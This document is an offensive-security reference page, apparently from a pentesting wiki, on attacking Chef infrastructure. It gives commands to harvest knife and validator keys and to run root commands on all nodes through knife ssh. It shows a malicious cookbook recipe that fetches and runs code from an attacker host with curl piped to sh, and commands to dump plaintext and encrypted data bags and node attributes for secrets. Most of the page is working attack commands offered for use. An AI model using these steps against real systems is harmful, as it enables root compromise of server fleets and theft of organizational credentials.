---
title: "Chef: abusing knife credentials, cookbooks, and data bags"
description: "Attacking Chef: reusing stolen knife client keys and the validation key to authenticate to the Chef server, uploading malicious cookbooks and editing run lists so nodes converge attacker code as root, running commands across nodes with knife ssh, and looting data bags and node attributes for secrets."
keywords:
  - Chef
  - knife
  - cookbook
  - data bag
  - run list
---

# Chef

Chef runs a pull model: `chef-client` on each node fetches its run list and cookbooks from the Chef Infra Server and converges them as root. Administration is done from a workstation with `knife`, authenticated by client private keys. The leverage points are those keys, the cookbooks the nodes run, and the data bags that hold the organization's secrets.

## Find credentials and the server

```bash
find / -name '*.pem' -path '*chef*' 2>/dev/null; ls ~/.chef/ /etc/chef/
cat ~/.chef/knife.rb /etc/chef/client.rb          # chef_server_url, node_name, client_key, validation_key
```

The files that matter are `client.pem` (a node's or user's key), `knife.rb` (the admin config), and `validation.pem`/`validator.pem` (the org validator key used to bootstrap new nodes). Any of them authenticates to the Chef server with that identity.

## Run commands across nodes

With valid knife credentials, `knife ssh` (or `knife winrm`) runs a command on every node matching a search, in one step:

```bash
knife node list                                   # inventory
knife search node 'role:web' -i                   # nodes by role/attribute
knife ssh 'name:*' 'id' -x root                   # run as root on all nodes over SSH
```

## Upload a cookbook and edit the run list

Code execution on nodes that do not expose SSH comes through the convergence itself: upload a cookbook with a malicious resource and add it to a node's or role's run list; the node runs it as root at its next `chef-client` run.

```ruby
# recipes/default.rb in an uploaded cookbook
execute 'x' do
  command 'curl -s https://attacker/a | sh'
end
```

```bash
knife cookbook upload evil
knife node run_list add web1 'recipe[evil]'       # or edit a role's run_list to hit many nodes at once
```

## Loot data bags and attributes

Chef data bags hold shared secrets; encrypted data bags are protected by a key that is distributed to the nodes (and the workstation) that need it, so a foothold on either recovers it:

```bash
knife data bag list
knife data bag show secrets credentials                              # plaintext bag
knife data bag show secrets credentials --secret-file /etc/chef/encrypted_data_bag_secret  # encrypted bag
knife node show web1 -a default                                      # attributes, which often carry secrets
```

## Follow-on

Valid knife credentials give code execution as root across every node (through `knife ssh` and through cookbook convergence); the data bags, node attributes, and the validator key extend the reach and feed credential reuse into the directory and cloud accounts those secrets unlock.

## References

- [knife documentation](https://docs.chef.io/workstation/knife/)
- [Chef data bags and encrypted data bags](https://docs.chef.io/data_bags/)
- [knife ssh](https://docs.chef.io/workstation/knife_ssh/)
